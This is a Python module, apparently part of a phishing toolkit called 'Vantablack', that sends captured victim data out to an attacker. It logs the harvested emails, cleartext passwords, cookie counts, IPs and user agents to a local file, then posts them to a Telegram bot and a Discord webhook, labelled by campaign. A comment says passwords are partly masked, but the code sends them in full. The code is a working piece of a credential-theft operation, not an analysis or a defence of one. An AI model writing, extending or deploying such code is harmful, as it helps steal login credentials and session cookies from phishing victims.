import aiohttp
import asyncio
import json
import time
from typing import Dict, Any, Optional
from core.common.config import get

class ExfiltrationManager:
    """
    Gère l'exfiltration des données capturées vers des canaux externes (Telegram, Discord).
    """
    
    def __init__(self):
        self.telegram_token = get("TELEGRAM_BOT_TOKEN")
        self.telegram_chat_id = get("TELEGRAM_CHAT_ID")
        self.discord_webhook = get("DISCORD_WEBHOOK_URL")
        
    async def notify_capture(self, session_id: str, data: Dict[str, Any], data_type: str = "credentials"):
        """
        Envoie une notification lors d'une capture (credentials ou cookies).
        """
        # 1. Log to file locally (Reliability)
        self._log_capture_locally(session_id, data, data_type)
        
        # 2. External Notifications
        message = self._format_message(session_id, data, data_type)
        
        tasks = []
        if self.telegram_token and self.telegram_chat_id:
            tasks.append(self._send_telegram(message))
            
        if self.discord_webhook:
            tasks.append(self._send_discord(message))
            
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
            
    def _log_capture_locally(self, session_id: str, data: Dict[str, Any], data_type: str):
        """Logs capture to local file for persistence."""
        try:
            log_entry = {
                "timestamp": time.time(),
                "session_id": session_id,
                "type": data_type,
                "data": data
            }
            # Use absolute path or relative to project root
            # Assuming CWD is project root
            with open("core/logs/captures.jsonl", "a") as f:
                f.write(json.dumps(log_entry) + "\n")
        except Exception as e:
            print(f"Local Log Error: {e}")

    def _format_message(self, session_id: str, data: Dict[str, Any], data_type: str) -> str:
        """Formate le message pour les notifications."""
        icon = "🔑" if data_type == "credentials" else "🍪"
        title = f"{icon} Vantablack Capture: {data_type.upper()}"
        
        campaign_id = data.get("campaign_id", "Unknown")
        ip = data.get("client_ip", data.get("ip", "Unknown"))
        user_agent = data.get("user_agent", "Unknown")
        
        # Masquer partiellement les mots de passe/cookies pour la notif (sécurité opsec)
        # On envoie juste les métadonnées et un snippet
        
        content = f"**{title}**\n"
        content += f"🆔 Session: `{session_id}`\n"
        content += f"📢 Campaign: `{campaign_id}`\n"
        content += f"🌍 IP: `{ip}`\n"
        content += f"📱 UA: `{user_agent}`\n"
        
        if data_type == "credentials":
            # Check captured_data first (from session object)
            captured = data.get("captured_data", data)
            email = captured.get("email", captured.get("username", "N/A"))
            password = captured.get("password", captured.get("pass", "******"))
            
            content += f"📧 Email: `{email}`\n"
            content += f"🔒 Password: `{password}`\n"
            
        elif data_type == "cookies":
            cookies = data.get("cookies", [])
            cookie_count = len(cookies)
            content += f"🍪 Cookies Captured: {cookie_count}\n"
            
        return content

    async def _send_telegram(self, message: str):
        """Envoie une notification via Telegram."""
        url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
        payload = {
            "chat_id": self.telegram_chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload) as response:
                    if response.status != 200:
                        print(f"Telegram Error: {await response.text()}")
        except Exception as e:
            print(f"Telegram Exfiltration Failed: {e}")

    async def _send_discord(self, message: str):
        """Envoie une notification via Discord Webhook."""
        payload = {
            "content": message
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.discord_webhook, json=payload) as response:
                    if response.status not in [200, 204]:
                        print(f"Discord Error: {await response.text()}")
        except Exception as e:
            print(f"Discord Exfiltration Failed: {e}")

# Global instance
exfiltration_manager = ExfiltrationManager()
